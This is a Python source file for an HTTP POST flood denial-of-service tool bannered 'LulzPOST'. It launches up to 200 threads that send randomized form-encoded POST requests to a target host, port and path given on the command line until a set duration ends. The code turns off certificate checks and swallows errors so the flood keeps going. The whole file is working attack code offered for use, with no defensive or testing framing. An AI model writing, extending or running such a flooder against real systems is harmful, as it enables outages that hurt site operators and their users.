import threading, sys, os, time, requests, json, time
from random import choice, randint
from utils import *

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def flood():

    url = sys.argv[2]
    port = int(sys.argv[3])
    duration = int(sys.argv[4])

    time.sleep(5)

    stoptime = time.time() + duration
    session = createsession()
    while time.time() < stoptime:
        try:
            headers = buildheaders(url)

            url_encoded_data = f'{choice(keywords)}={choice(keywords)}'

            for _ in range(randint(0, 12)):
                if randint(0,1) == 1: url_encoded_data += f'&{choice(keywords)}={choice(keywords)}'
                else: pass

            data = url_encoded_data
            headers.update({'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(url_encoded_data))})

            session.post(f'{"http" if port == 80 else "https"}://{url}:{port}/{buildblock(url)}', headers=headers, data=data, verify=False, timeout=2, allow_redirects=False, stream=False)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$$
            | $$                | $$          | $$__  $$ /$$__  $$ /$$__  $$|__  $$__/
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  \ $$| $$  \ $$| $$  \__/   | $$   
            | $$      | $$  | $$| $$|____ /$$/| $$$$$$$/| $$  | $$|  $$$$$$    | $$   
            | $$      | $$  | $$| $$   /$$$$/ | $$____/ | $$  | $$ \____  $$   | $$   
            | $$      | $$  | $$| $$  /$$__/  | $$      | $$  | $$ /$$  \ $$   | $$   
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$      |  $$$$$$/|  $$$$$$/   | $$   
            |________/ \______/ |__/|________/|__/       \______/  \______/    |__/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')